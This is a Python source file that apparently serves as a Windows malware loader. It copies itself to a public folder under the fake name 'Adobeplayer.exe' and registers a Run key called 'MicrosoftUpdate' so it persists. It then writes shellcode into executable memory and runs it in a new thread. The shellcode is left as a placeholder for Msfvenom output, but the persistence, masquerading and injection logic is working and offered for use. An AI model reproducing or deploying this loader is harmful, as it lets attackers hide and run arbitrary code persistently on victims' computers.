import sys
import time
import shutil
import winreg
import ctypes
import os

arrive_path = "C:\\Users\\Public\\Libraries\\Adobeplayer.exe"

def copyfile_to_C_disk():
    shutil.copy(sys.argv[0],arrive_path)

def edit_reg():
    Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_WRITE)
    winreg.SetValueEx(Key,"MicrosoftUpdate",0, winreg.REG_SZ,arrive_path)


# Shellcode C-type file for MsfVenom
shellcode=(''' ---------------> PUT Msfvenom(C program-Type) Shellcode Here !!! <------------- ''')


if __name__ == "__main__":
    if os.path.isfile(arrive_path) == False:
        copyfile_to_C_disk()
        edit_reg()
    else:
        pass
    time.sleep(60)
    ptr = ctypes.windll.kernel32.VirtualAlloc(0, 4096, ctypes.c_int(0x1000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(shellcode)))
    byte = bytearray()
    byte.extend(map(ord,shellcode))
    buffer = (ctypes.c_char * len(shellcode)).from_buffer(byte)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buffer, ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.c_int(ptr),
                                              ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))